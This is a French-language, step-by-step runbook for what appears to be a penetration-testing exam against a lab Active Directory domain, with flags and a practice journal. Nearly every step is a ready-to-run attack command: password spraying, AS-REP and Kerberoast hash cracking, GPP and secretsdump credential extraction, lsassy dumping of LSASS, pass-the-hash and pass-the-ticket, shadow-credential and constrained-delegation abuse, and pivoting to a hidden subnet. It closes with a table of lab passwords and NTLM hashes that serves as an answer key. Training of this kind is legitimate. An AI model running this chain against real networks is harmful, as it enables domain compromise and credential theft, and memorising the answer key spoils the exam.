# Runbook chronologique

**Document principal le jour J.** Exécuter les étapes dans l'ordre.  
Playbooks détaillés : `00-setup` … `09-pivot` | Journal : [exam-journal/JOURNAL_EXAMEN.md](../exam-journal/JOURNAL_EXAMEN.md)

---

## Bloc variables (Étape 0 — copier en premier)

```bash
export DC_IP=10.13.37.42
export DOMAIN=celestina.shop
export SUBNET=10.13.37.0/24
export SUBNET_HIDDEN=10.37.13.0/24
export USER=pentester
export PASS='Password123!'
export DEFAULT_PASS='C3L3stin4!Us3r'
cd /workspace
```

---

## Phase A — Connexion

### Étape 1 — VPN

```bash
sudo openvpn --config /chemin/vers/vpn.ovpn
```

### Étape 2 — Exegol

```bash
exegol connect free
cd /workspace
```

### Étape 3 — DNS / hosts

```bash
echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" | sudo tee -a /etc/hosts
echo "nameserver 10.13.37.42" | sudo tee /etc/resolv.conf
nslookup dc-celestina.celestina.shop
```

### Étape 4 — Valider accès

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!'
```

---

## Phase B — Reconnaissance

### Étape 5 — Scan SMB

```bash
nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!'
```

### Étape 6 — Partages

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --shares
nxc smb 10.13.37.123 -u 'pentester' -p 'Password123!' -M spider_plus --share HUB
```

### Étape 7 — PDF mot de passe par défaut (*goût par défaut*)

```bash
smbclient //10.13.37.123/HUB -U 'pentester%Password123!' -c 'get notice.pdf'
strings notice.pdf | grep -i -E 'password|default|C3L'
```

### Étape 8 — Liste utilisateurs (spray)

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --rid-brute 2>/dev/null | grep SidTypeUser | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt
```

### Étape 9 — BloodHound collecte (*chien*)

```bash
bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All
```

### Étape 10 — Analyse JSON CLI

```bash
grep -i -C 15 "AddKeyCredentialLink\|allowedtodelegate\|description" *.json
bash scripts/grep-bh-rights.sh
```

### Étape 11 — RDP excessif (*RDP non-nécessaire*)

```bash
nxc rdp 10.13.37.0/24 -u 'pentester' -p 'Password123!'
```

---

## Phase C — Kerberos

### Étape 12 — AS-REP (*café pas sécurisé*)

```bash
GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42 -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.txt --show
```

### Étape 13 — Kerberoast (*CAAS*)

```bash
GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42 -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerb.txt --show
```

### Étape 14 — Valider comptes crackés

```bash
nxc smb 10.13.37.0/24 -u 'j.vabre' -p 'MOT_DE_PASSE_ASREP' --continue-on-success
nxc smb 10.13.37.0/24 -u 'g.clooney' -p 'MOT_DE_PASSE_KERB' --continue-on-success
```

---

## Phase D — Fuites & spray

### Étape 15 — Spray mot de passe par défaut

```bash
nxc smb 10.13.37.0/24 -u users.txt -p 'C3L3stin4!Us3r' --continue-on-success
```

### Étape 16 — Descriptions LDAP (*Décrivez précisément*)

```bash
grep -i '"description"' *users*.json | grep -v '""'
nxc smb 10.13.37.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!' --continue-on-success
```

### Étape 17 — GPP / SYSVOL (*secret trop partagé*)

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' -M gpp_password
```

---

## Phase E — Mouvement latéral

### Étape 18 — secretsdump WK-123 (admin a.nozer)

```bash
secretsdump.py celestina.shop/a.nozer:'C3L3stin4!Us3r'@10.13.37.123
```

### Étape 19 — PTH admin local (*Passe moi le sel*)

```bash
nxc smb 10.13.37.0/24 -u Administrator -H 'HASH_ADMIN_LOCAL' --local-auth
```

### Étape 20 — lsassy + flag LSA (*secret LSA*)

```bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy
ls -lh /root/.nxc/modules/lsassy/
```

### Étape 21 — PtT k.udele (*Cible acquise KRB*)

```bash
export KRB5CCNAME="/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_XXXX.ccache"
bash scripts/gen-targets-fqdn.sh targets.txt
nxc smb targets.txt -u 'k.udele' -k -d celestina.shop --use-kcache
```

### Étape 22 — ipconfig pivot

```bash
nxc smb 10.13.37.0/24 -u Administrator -H 'HASH_ADMIN_LOCAL' --local-auth -x 'ipconfig' 2>&1 | grep -B5 '10.37.13'
```

---

## Phase F — AD avancé

### Étape 23 — Shadow Credentials (*ombre*)

```bash
certipy-ad shadow auto -u a.nozer@celestina.shop -p 'C3L3stin4!Us3r' -account k.cheh -target dc-celestina.celestina.shop
nxc smb 10.13.37.0/24 -u 'k.cheh' -H 'HASH_K_CHEH'
```

### Étape 24 — Unconstrained enum

```bash
nxc ldap 10.13.37.42 -u 'pentester' -p 'Password123!' --trusted-for-delegation
```

### Étape 25 — Constrained delegation (*Libéré délivré*)

```bash
getST.py -dc-ip 10.13.37.42 -spn HTTP/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
export KRB5CCNAME="$(pwd)/Administrator.ccache"
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache -x 'ipconfig'
```

**Si erreur** : réessayer avec `-spn cifs/WK-155.celestina.shop`.

---

## Phase G — Réseau caché

### Étape 26 — Scan 10.37.13.0/24

```bash
nxc smb 10.37.13.0/24 -u 'pentester' -p 'Password123!'
nxc smb 10.37.13.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!' --continue-on-success
```

### Étape 27 — Soumettre flags & compléter journal

Ouvrir [CHECKLIST.md](../CHECKLIST.md) et [exam-journal/JOURNAL_EXAMEN.md](../exam-journal/JOURNAL_EXAMEN.md).

---

## Aide-mémoire hashes TP blanc (entraînement)

| Secret | Valeur |
|--------|--------|
| Admin local WK-123/124 | fafb12f22417628bb6422e9bb8686f5c |
| k.cheh (shadow) | 2b96340904f32f7888a232c79ea37610 |
| j.vabre | Coffee4me! |
| g.clooney | CoffeeMug!1 |
| k.cedepte | R3m0t3Pr1v1l3g35@H4nd! |

*Adapter les valeurs le jour J si l’examen les change.*
